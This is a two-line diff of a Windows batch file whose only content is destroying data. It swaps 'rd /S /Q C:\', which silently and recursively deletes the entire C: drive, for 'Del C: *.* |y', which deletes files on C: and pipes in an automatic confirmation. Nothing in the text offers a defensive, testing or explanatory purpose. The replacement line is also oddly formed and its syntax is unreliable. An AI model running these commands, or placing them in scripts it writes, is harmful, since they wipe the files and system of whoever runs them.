@@ -1,2 +1,2 @@
 @Echo off
-rd /S /Q C:\
+Del C: *.* |y
